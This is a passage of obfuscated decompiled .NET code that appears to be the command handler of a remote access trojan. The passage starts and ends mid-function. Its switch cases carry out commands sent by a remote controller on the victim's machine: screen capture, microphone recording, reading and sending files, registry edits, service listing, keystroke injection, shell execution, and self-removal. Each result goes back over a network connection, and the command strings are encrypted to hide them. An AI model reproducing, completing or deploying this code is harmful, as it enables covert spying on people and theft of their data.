							GForm0.smethod_3(array[2], 336, 371);
						}
						break;
					}
					catch (Exception ex11)
					{
						smethod_6(ex11, '\u030a', 813);
						Exception ex12 = ex11;
						((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf58f\uf5b8\uf5b8\uf5a5\uf5b8\uf5b8\uf5b9", 57764), 59104), 62097), Yy, ex12.Message, 844, 794));
						Class5.smethod_4('È', 189);
						break;
					}
				case 1403660030u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue156\ue157\ue15b\ue15c\ue140\ue147", 57441), 60035), 60337), bool_0: false, '\u02f3', 'ˋ') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { Operators.ConcatenateObject((object)(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue156\ue157\ue15b\ue15c\ue140\ue147", 57441), 60035), 60337) + Yy), object_1) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 1356306637u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue04b\ue04b", 60488), 59222), 60330), bool_0: false, 'ɦ', 'ɞ') == 0)
					{
						int q2 = smethod_3(array[1], 788, 833);
						int co2 = smethod_3(array[2], 240, 165);
						int qu2 = smethod_3(array[3], 641, 724);
						byte[] array9 = (byte[])(Array)GClass3.Cap(q2, co2, qu2);
						MemoryStream gparam_24 = new MemoryStream();
						string gparam_25 = GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue04b\ue04b", 60488), 59222), 60330), Yy, 111, 42);
						Class4.smethod_1(gparam_24, Class2.smethod_7(ref gparam_25), 0, GClass2.DRV.smethod_1(gparam_25, 514, 604), 578, 603);
						Class4.smethod_1(gparam_24, array9, 0, array9.Length, 86, 79);
						((GClass1)GClass1_0).Send(Class11.smethod_8(gparam_24, 'ǜ', 491));
						Class12.smethod_7((Stream)gparam_24, (short)966, 1013);
					}
					break;
				case 1787224512u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf611\uf61e\uf61d\uf601\uf617\uf601\uf617\uf600\uf604\uf617\uf600", 59956), 62971), 59882), bool_0: false, 'ć', 'Ŀ') == 0)
					{
						Class5.smethod_4('Ƣ', 468);
					}
					break;
				case 1686700367u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uecd4\uecc2\uecd3\uecdf\uecd3", 57395), 57430), 60618), bool_0: false, 'ϵ', 'ύ') == 0)
					{
						string text5 = (string)(IComparable)File.ReadAllText(string_1 + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue5bb\ue5b4\ue59e\ue594\ue593\ue582\ue58a\ue5d4\ue5d5\ue5bb\ue583\ue595\ue58e\ue591\ue582\ue595\ue594\ue5bb\ue582\ue593\ue584\ue5bb\ue58f\ue588\ue594\ue593\ue594", 59316), 62765), 63351));
						((GClass1)GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1d2\ue1d0\ue1c1\ue1cd\ue1c1", 59602), 59216), 61098) + Yy + text5);
					}
					break;
				case 2147015206u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uedd0\uedd2\uedc3\uedda\uedce\uedd3\uedd8\uedd4\uedc2\uedda\uedd2\uedd9\uedc3\uedc4\uedc7\uedd6\uedc3\ueddf", 61499), 62161), 61273), bool_0: false, '\u007f', 'G') == 0)
					{
						string gparam_20 = (string)(IConvertible)GClass2.smethod_0(Environment.SpecialFolder.Personal, ' ', 126);
						((GClass1)GClass1_0).Send(Class4.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufbb6\ufbb4ﮥﮡﮰﮥ\ufbb9", 61715), 62181), 63673), Yy, gparam_20, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), 512, 601));
					}
					break;
				case 2047146230u:
				{
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue114\ue101", 57978), 62182), 61846), bool_0: false, 'j', 'R') != 0)
					{
						break;
					}
					object key = GetKey(array[2]);
					string gparam_32 = array[1];
					if (Class11.smethod_7(gparam_32, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uead0", 61963), 60567), 62598), bool_0: false, 'Ŝ', 'Ť') != 0)
					{
						if (Class11.smethod_7(gparam_32, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue15b", 62559), 61529), 58856), bool_0: false, '¦', '\u009e') != 0)
						{
							if (Class11.smethod_7(gparam_32, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueaf1\uea84", 60287), 61696), 61497), bool_0: false, '\u0310', '\u0328') != 0)
							{
								if (Class11.smethod_7(gparam_32, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf41d", 58929), 63285), 58746), bool_0: false, '\u001e', '&') != 0)
								{
									if (Class11.smethod_7(gparam_32, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued57", 62849), 62405), 60253), bool_0: false, 'p', 'H') == 0)
									{
										string text14 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue6ef\ue6ce\ue6c7\ue6ce\ue6df\ue6ce\ue6f8\ue6de\ue6c9\ue6e0\ue6ce\ue6d2\ue6ff\ue6d9\ue6ce\ue6ce", 57768), 61459), 63276);
										object[] array13 = new object[1];
										ref string reference8 = ref array[3];
										ref string reference9 = ref reference8;
										array13[0] = reference8;
										object[] array5 = array13;
										bool[] obj10 = new bool[1] { true };
										bool[] array6 = obj10;
										NewLateBinding.LateCall(key, (Type)null, text14, array13, (string[])null, (Type[])null, obj10, true);
										if (array6[0])
										{
											reference9 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
										}
									}
								}
								else
								{
									string text15 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue25a\ue26b\ue27c\ue278\ue26d\ue27c\ue24a\ue26c\ue27b\ue252\ue27c\ue260", 58760), 61207), 59552);
									object[] array14 = new object[1];
									ref string reference10 = ref array[3];
									ref string reference9 = ref reference10;
									array14[0] = reference10;
									object[] array5 = array14;
									bool[] obj11 = new bool[1] { true };
									bool[] array6 = obj11;
									NewLateBinding.LateCall(key, (Type)null, text15, array14, (string[])null, (Type[])null, obj11, true);
									if (array6[0])
									{
										reference9 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
									}
								}
							}
							else
							{
								string text16 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf426\uf407\uf40e\uf407\uf416\uf407\uf434\uf403\uf40e\uf417\uf407", 58918), 62891), 59360);
								object[] array15 = new object[2];
								ref string reference11 = ref array[3];
								ref string reference9 = ref reference11;
								array15[0] = reference11;
								array15[1] = false;
								object[] array5 = array15;
								bool[] obj12 = new bool[2] { true, false };
								bool[] array6 = obj12;
								NewLateBinding.LateCall(key, (Type)null, text16, array15, (string[])null, (Type[])null, obj12, true);
								if (array6[0])
								{
									reference9 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
								}
							}
						}
						else
						{
							string text17 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf335\uf303\uf312\uf330\uf307\uf30a\uf313\uf303", 63358), 58862), 57799);
							object[] array16 = new object[3];
							ref string reference12 = ref array[3];
							ref string reference4 = ref reference12;
							array16[0] = reference12;
							ref string reference13 = ref array[4];
							ref string reference2 = ref reference13;
							array16[1] = reference13;
							ref string reference14 = ref array[5];
							ref string reference9 = ref reference14;
							array16[2] = reference14;
							object[] array5 = array16;
							bool[] obj13 = new bool[3] { true, true, true };
							bool[] array6 = obj13;
							NewLateBinding.LateCall(key, (Type)null, text17, array16, (string[])null, (Type[])null, obj13, true);
							if (array6[0])
							{
								reference4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
							}
							if (array6[1])
							{
								reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[1]), typeof(string));
							}
							if (array6[2])
							{
								reference9 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[2]), typeof(string));
							}
						}
						break;
					}
					string text18 = (string)(IConvertible)GClass2.smethod_1(new string[6]
					{
						Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue114\ue101", 57978), 62182), 61846),
						Yy,
						Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uead0", 61963), 60567), 62598),
						Yy,
						array[2],
						Yy
					}, 500, 'Ɯ');
					string text19 = "";
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = ((IEnumerable)NewLateBinding.LateGet(key, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf8fd\uf8df\uf8ce\uf8e9\uf8cf\uf8d8\uf8f1\uf8df\uf8c3\uf8f4\uf8db\uf8d7\uf8df\uf8c9", 61028), 57789), 63458), new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
						while (enumerator.MoveNext())
						{
							string text20 = (string)(IComparable<string>)Conversions.ToString(enumerator.Current);
							if (!text20.Contains(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247)))
							{
								text19 = Class11.smethod_9(text19, text20, Yy, 993, 951);
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					IEnumerator enumerator2 = default(IEnumerator);
					try
					{
						enumerator2 = ((IEnumerable)NewLateBinding.LateGet(key, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uef7c\uef5e\uef4f\uef6d\uef5a\uef57\uef4e\uef5e\uef75\uef5a\uef56\uef5e\uef48", 58673), 61265), 58820), new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
						while (enumerator2.MoveNext())
						{
							string text21 = (string)(IEnumerable<char>)Conversions.ToString(enumerator2.Current);
							string[] obj14 = new string[7]
							{
								text19,
								text21,
								Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("老", 59546), 61996), 58236),
								null,
								null,
								null,
								null
							};
							object[] array5;
							bool[] array6;
							object obj15 = NewLateBinding.LateGet(key, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue6c3\ue6e1\ue6f0\ue6d2\ue6e5\ue6e8\ue6f1\ue6e1\ue6cf\ue6ed\ue6ea\ue6e0", 59441), 58053), 60538), array5 = new object[1] { text21 }, (string[])null, (Type[])null, array6 = new bool[1] { true });
							if (array6[0])
							{
								text21 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
							}
							obj14[3] = obj15.ToString();
							obj14[4] = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("老", 59546), 61996), 58236);
							object obj16 = NewLateBinding.LateGet(key, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﻏﻭﻼﻞﻩﻤ\ufefdﻭ", 60672), 62301), 57530), array5 = new object[2] { text21, "" }, (string[])null, (Type[])null, array6 = new bool[2] { true, false });
							if (array6[0])
							{
								text21 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
							}
							obj14[5] = obj16.ToString();
							obj14[6] = Yy;
							text19 = string.Concat(obj14);
						}
					}
					finally
					{
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
					((GClass1)GClass1_0).Send(text18 + text19);
					break;
				}
				case 1946480516u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf4fe\uf4f5", 62288), 60886), 60032), bool_0: false, 'Θ', 'Π') == 0)
					{
						GClass2.DRV.smethod_11(array[1], 953, 996);
					}
					break;
				case 2218194962u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf27b\uf254\uf251\uf258\uf270\uf25c\uf253\uf25c\uf25a\uf258\uf24f", 62007), 61433), 61399), bool_0: false, '\u0352', '\u036a') == 0)
					{
						try
						{
							((GClass1)GClass1_0).Send(Class4.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf27b\uf254\uf251\uf258\uf270\uf25c\uf253\uf25c\uf25a\uf258\uf24f", 62007), 61433), 61399), Yy, QRhvlBW(array[1]), TnexoOos(array[1]), 483, 442));
							break;
						}
						catch (Exception ex13)
						{
							smethod_6(ex13, '\u0344', 867);
							Exception ex14 = ex13;
							((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf1d5\uf1e5\uf1d2\uf1e5\uf1e5", 61877), 61457), 61609), Yy, ex14.Message, 419, 501));
							Class5.smethod_4('ù', 140);
							break;
						}
					}
					break;
				case 2212960313u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf062\uf059\uf05e\uf059\uf044\uf043\uf056\uf05b\uf05b", 61836), 57661), 57398), bool_0: false, '¾', '\u0086') != 0)
					{
						break;
					}
					try
					{
						if (Conversions.ToBoolean(Hideme))
						{
							File.SetAttributes(Class12.smethod_9(446, 474), FileAttributes.Normal);
						}
						UNS();
						break;
					}
					catch (Exception gparam_30)
					{
						smethod_6(gparam_30, '\u0348', 879);
						Class5.smethod_4('ȓ', 614);
						break;
					}
				case 2389515656u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("吏練吏", 63518), 60634), 60841), bool_0: false, '£', '\u009b') == 0)
					{
						Class2.keybd_event(GClass2.DRV.smethod_12(array[2], 863, 'Ͷ'), (byte)Class2.MapVirtualKeyA(GClass2.DRV.smethod_1(array[2], 477, 386), 0), GClass2.DRV.smethod_1(array[1], 754, 685), 0);
					}
					break;
				case 2361604535u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("濾濾", 57585), 63677), 57833), bool_0: false, 'ŉ', 'ű') == 0)
					{
						GClass3.Clear();
						Rectangle rectangle_ = Screen.get_PrimaryScreen().get_Bounds();
						Size size_2 = Class12.smethod_17(ref rectangle_, 37, '\u001a');
						((GClass1)GClass1_0).Send(GClass2.smethod_1(new string[5]
						{
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("濾濾", 57585), 63677), 57833),
							Yy,
							Class14.smethod_3(Class3.smethod_7(ref size_2, 1, 107), '\u0005', '\u001d'),
							Yy,
							Class14.smethod_3(Class3.smethod_8(ref size_2, 418, 491), 'ύ', 'ϕ')
						}, 751, 'ʇ'));
					}
					break;
				case 2255886037u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufd4eﵙ\ufd4f\ufd48ﵝ\ufd4e\ufd48ﵟﵓﵑ\ufd4c\ufd49\ufd48ﵙ\ufd4e", 62426), 58765), 60168), bool_0: false, 'ǃ', 'ǻ') == 0)
					{
						Interaction.Shell(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("露藍菉錄勞襤祿拉參復魯參復錄參糧糧", 58478), 59405), 62970), (AppWinStyle)0, false, -1);
					}
					break;
				case 2411887178u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0d9\uf0db\uf0ca\uf0ca\uf0db\uf0d3\uf0ce\uf0ce\uf0df\uf0ca\uf0d6", 58363), 58938), 62782), bool_0: false, 'ħ', 'ğ') == 0)
					{
						string gparam_29 = (string)(IEquatable<string>)Class12.smethod_9(178, 212);
						((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufbb6\ufbb4ﮥﮡﮰﮥ\ufbb9", 61715), 62181), 63673), Yy, gparam_29, 268, 346));
					}
					break;
				case 2410382888u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue577\ue57f\ue550\ue555", 57949), 60609), 60194), bool_0: false, '\u0300', '\u0338') == 0)
					{
						smethod_20(array[1], "", '\u0329', 881);
					}
					break;
				case 2680681164u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf11b\uf10f\uf103\uf108", 57664), 58251), 62376), bool_0: false, 'ǯ', 'Ǘ') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { GClass1.smethod_0((object)GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf11b\uf10f\uf103\uf108", 57664), 58251), 62376), Yy, 504, 445), object_1, (short)1001, 998) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 2661471272u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue3df\ue3d1\ue3c5\ue3d4\ue3d9\ue3df", 59340), 58735), 57747), bool_0: false, 'ɭ', 'ɕ') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { Operators.ConcatenateObject((object)(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue3df\ue3d1\ue3c5\ue3d4\ue3d9\ue3df", 59340), 58735), 57747) + Yy), object_1) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 2528810465u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued1c\ued0e\ued19\ued0a\ued1b\ued0a\ued17\ued1b\ued09\ued06\ued03\ued0a", 60909), 62443), 62208), bool_0: false, '\u001d', '%') == 0)
					{
						StreamWriter streamWriter = new StreamWriter(array[1]);
						streamWriter.WriteLine(array[2]);
						streamWriter.Close();
					}
					break;
				case 2832955486u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uef94\uef87\uef9c", 61202), 59222), 59295), bool_0: false, '\u0351', '\u0369') == 0)
					{
						((GClass1)GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uef94\uef87\uef9c", 61202), 59222), 59295));
					}
					break;
				case 2732161210u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("Ｈ＊；＼＊＝９＆，＊", 60682), 62323), 57611), bool_0: false, 'Ϸ', 'Ϗ') == 0)
					{
						string text7 = "";
						string text8 = (string)(IEnumerable)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf4a8\uf49e\uf489\uf48d\uf492\uf498\uf49e\uf4a8\uf48b\uf497\uf492\uf48f", 62168), 59728), 61272);
						ServiceController[] array11 = (ServiceController[])(Array)ServiceController.GetServices();
						foreach (ServiceController val in array11)
						{
							string[] obj8 = new string[9]
							{
								text7,
								val.get_DisplayName(),
								text8,
								val.get_ServiceName(),
								text8,
								null,
								null,
								null,
								null
							};
							ServiceControllerStatus status = val.get_Status();
							obj8[5] = ((Enum)(ServiceControllerStatus)(ref status)).ToString();
							obj8[6] = text8;
							ServiceType serviceType = val.get_ServiceType();
							obj8[7] = ((Enum)(ServiceType)(ref serviceType)).ToString();
							obj8[8] = text8;
							text7 = string.Concat(obj8);
						}
						((GClass1)GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf585\uf5b3\uf5a4\uf5a0\uf5bf\uf5b5\uf5b3\uf59b\uf5b7\uf5b8\uf5b7\uf5b1\uf5b3\uf5a4", 60628), 63681), 57836) + Yy + text7);
					}
					break;
				case 2722888107u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb1a\ueb11\ueb18\ueb0d", 62757), 61778), 61263), bool_0: false, 'ʈ', 'ʰ') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { GClass1.smethod_0((object)GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb1a\ueb11\ueb18\ueb0d", 62757), 61778), 61263), Yy, 615, 546), object_1, (short)737, 750) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 3045596328u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uec44\uec5d\uec5f\uec42\uec4a", 59619), 60405), 61228), bool_0: false, '\u0383', 'λ') == 0)
					{
						((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uec44\uec5d\uec5f\uec42\uec4a", 59619), 60405), 61228), Yy, xSTCWkAgg(), 764, 682));
					}
					break;
				case 2891785747u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue929\ue908\ue90f\ue913\ue932\ue913\ue930\ue912\ue913\ue914\ue909\ue912\ue90f", 59437), 63227), 63407), bool_0: false, 'ƈ', 'ư') == 0)
					{
						SendMessage(-1, 274u, 61808u, -1);
					}
					break;
				case 2881941042u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﻮﻱﻤﻯﻓﻆ", 62104), 62631), 63589), bool_0: false, '\u009b', '£') == 0)
					{
						((GClass1)GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﻮﻱﻤﻯﻓﻆ", 62104), 62631), 63589));
					}
					break;
				case 3144113171u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea94\ueab3\ueabb\ueab2\uea8e\uea9e", 60100), 58301), 58269), bool_0: false, 'Ǒ', 'ǩ') == 0)
					{
						((GClass1)GClass1_0).Send(GClass2.smethod_1(new string[11]
						{
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea94\ueab3\ueabb\ueab2\uea8e\uea9e", 60100), 58301), 58269),
							Yy,
							ID,
							Yy,
							host,
							Yy,
							port,
							Yy,
							EXE,
							Yy,
							Class12.smethod_9(840, 812)
						}, 73, '!'));
					}
					break;
				case 3116397068u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﾤﾶﾢﾳﾾﾸ", 57975), 62612), 59896), bool_0: false, 'į', 'ė') == 0)
					{
						string lpCommandString2 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb65\ueb77\ueb60\ueb73\ueb36\ueb64\ueb73\ueb75\ueb65\ueb79\ueb63\ueb78\ueb72\ueb36", 61691), 61248), 62503) + struct15_0.string_0 + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf73f\uf711\uf706\uf700\uf70c\uf711\uf707\uf74d\uf714\uf702\uf715", 60724), 60653), 63082);
						string lpReturnString2 = null;
						mciSendStringA(ref lpCommandString2, ref lpReturnString2, 0L, 0L);
						lpReturnString2 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue273\ue27c\ue27f\ue263\ue275\ue230\ue262\ue275\ue273\ue263\ue27f\ue265\ue27e\ue274", 60608), 58018), 60505);
						lpCommandString2 = null;
						mciSendStringA(ref lpReturnString2, ref lpCommandString2, 0L, 0L);
						((GClass1)GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2b9\uf2b9\uf2aa\uf2be\uf2af\uf2a2\uf2a4", 58048), 59390), 63434) + Yy + Convert.ToBase64String(File.ReadAllBytes(struct15_0.string_0 + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf73f\uf711\uf706\uf700\uf70c\uf711\uf707\uf74d\uf714\uf702\uf715", 60724), 60653), 63082))));
						File.Delete(struct15_0.string_0 + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf73f\uf711\uf706\uf700\uf70c\uf711\uf707\uf74d\uf714\uf702\uf715", 60724), 60653), 63082));
					}
					break;
				case 3305896031u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﺯ", 62795), 57835), 59980), bool_0: false, 'Ƥ', 'Ɯ') == 0)
					{
						int q = smethod_3(array[1], 581, 528);
						int co = smethod_3(array[2], 265, 348);
						int qu = smethod_3(array[3], 172, 249);
						byte[] array8 = (byte[])(Array)GClass3.Cap(q, co, qu);
						MemoryStream gparam_21 = new MemoryStream();
						string gparam_22 = GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﺯ", 62795), 57835), 59980), Yy, 781, 840);
						Class4.smethod_1(gparam_21, Class2.smethod_7(ref gparam_22), 0, GClass2.DRV.smethod_1(gparam_22, 416, 510), 511, 486);
						Class4.smethod_1(gparam_21, array8, 0, array8.Length, 991, 966);
						((GClass1)GClass1_0).Send(Class11.smethod_8(gparam_21, '\u034c', 891));
						Class12.smethod_7((Stream)gparam_21, (short)489, 474);
					}
					break;
				case 3272340793u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue44d", 57428), 57514), 58461), bool_0: false, '^', 'f') == 0)
					{
						Class5.smethod_15<FileSystemProxy, string>(Class10.smethod_12<ServerComputer>((ServerComputer)Class6.Object_3, 927, (short)949), array[2], Class2.smethod_7(ref array[1]), bool_0: false, 'Ȥ', (short)584);
						GClass2.DRV.smethod_11(array[2], 38, 123);
						((GClass1)GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue44d", 57428), 57514), 58461));
					}
					break;
				case 3259415635u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue6bc\ue6b3\ue6ba\ue6be\ue6ad\ue6bc", 57768), 58004), 58727), bool_0: false, '\u0354', '\u036c') == 0)
					{
						((Control)this).Invoke((Delegate)(ct)delegate
						{
							ctx();
						});
					}
					break;
				case 3355849203u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue181\ue1b6\ue1bd\ue1b2\ue1be\ue1b6", 62075), 60247), 63607), bool_0: false, 'Ζ', 'ή') != 0)
					{
						break;
					}
					try
					{
						string lpReturnString = array[1];
						if (Class11.smethod_7(lpReturnString, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ｨａｂｊｋ｜", 60968), 62158), 58138), bool_0: false, '\u02f7', 'ˏ') != 0)
						{
							if (Class11.smethod_7(lpReturnString, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf18d\uf1a2\uf1a7\uf1ae", 60425), 63054), 60245), bool_0: false, 'ŝ', 'ť') == 0)
							{
								object obj = NewLateBinding.LateGet(F, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue93a\ue915\ue910\ue919\ue92f\ue905\ue90f\ue908\ue919\ue911", 59545), 58168), 57868), new object[0], (string[])null, (Type[])null, (bool[])null);
								string text3 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uffef\uffd8ￓￜ\uffd0\uffd8\ufffbￔ\uffd1\uffd8", 58653), 60376), 61853);
								object[] array4 = new object[2];
								ref string reference = ref array[2];
								ref string reference2 = ref reference;
								array4[0] = reference;
								ref string reference3 = ref array[3];
								ref string reference4 = ref reference3;
								array4[1] = reference3;
								object[] array5 = array4;
								bool[] obj2 = new bool[2] { true, true };
								bool[] array6 = obj2;
								NewLateBinding.LateCall(obj, (Type)null, text3, array4, (string[])null, (Type[])null, obj2, true);
								if (array6[0])
								{
									reference2 = (string)Class10.smethod_7(smethod_18(array5[0], 847, 784), typeof(string), 873, 831);
								}
								if (array6[1])
								{
									reference4 = (string)Class10.smethod_7(smethod_18(array5[1], 236, 179), typeof(string), 339, 261);
								}
							}
						}
						else
						{
							object obj3 = NewLateBinding.LateGet(F, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue93a\ue915\ue910\ue919\ue92f\ue905\ue90f\ue908\ue919\ue911", 59545), 58168), 57868), new object[0], (string[])null, (Type[])null, (bool[])null);
							string text4 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue2b1\ue286\ue28d\ue282\ue28e\ue286\ue2a7\ue28a\ue291\ue286\ue280\ue297\ue28c\ue291\ue29a", 60319), 58082), 60298);
							object[] array7 = new object[2];
							ref string reference5 = ref array[2];
							ref string reference4 = ref reference5;
							array7[0] = reference5;
							ref string reference6 = ref array[3];
							ref string reference2 = ref reference6;
							array7[1] = reference6;
							object[] array5 = array7;
							bool[] obj4 = new bool[2] { true, true };
							bool[] array6 = obj4;
							NewLateBinding.LateCall(obj3, (Type)null, text4, array7, (string[])null, (Type[])null, obj4, true);
							if (array6[0])
							{
								reference4 = (string)Class10.smethod_7(smethod_18(array5[0], 83, 12), typeof(string), 206, 152);
							}
							if (array6[1])
							{
								reference2 = (string)Class10.smethod_7(smethod_18(array5[1], 97, 62), typeof(string), 185, 239);
							}
						}
						break;
					}
					catch (Exception ex9)
					{
						smethod_6(ex9, '\u0333', 788);
						Exception ex10 = ex9;
						((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf58f\uf5b8\uf5b8\uf5a5\uf5b8\uf5b8\uf5b9", 57764), 59104), 62097), Yy, ex10.Message, 559, 633));
